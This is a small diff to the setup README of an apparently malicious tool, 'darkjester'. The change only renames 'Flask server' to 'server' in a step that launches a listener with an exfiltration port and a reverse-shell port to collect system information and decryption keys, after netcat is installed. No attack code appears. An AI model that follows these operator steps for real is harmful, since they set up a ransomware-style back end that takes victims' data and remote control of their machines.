@@ -66,8 +66,8 @@
       pacman -S gnu-netcat
       ```
 
-3. **Run the Flask server**:
-    - Ensure the Flask server is set up and running to accept system information and decryption keys:
+3. **Run the server**:
+    - Ensure the server is set up and running to accept system information and decryption keys:
       ```bash
       python3 darkjester_server.py <EXFIL_PORT> <REVERSE_SHELL_PORT>
       ```
